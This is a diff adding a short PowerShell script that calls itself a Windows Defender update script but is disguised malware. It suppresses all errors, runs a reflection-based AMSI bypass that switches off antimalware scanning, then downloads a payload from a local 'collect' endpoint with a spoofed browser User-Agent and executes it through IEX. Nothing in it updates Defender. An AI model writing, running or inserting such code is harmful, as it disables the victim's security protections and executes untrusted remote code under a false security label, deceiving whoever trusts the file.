@@ -1,0 +1,11 @@
+# Windows Defender Update Script
+$ErrorActionPreference = 'SilentlyContinue'
+
+# AMSI Bypass attempt
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# Download and execute
+$url = "http://localhost:5000/collect/payload"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+IEX($wc.DownloadString($url))
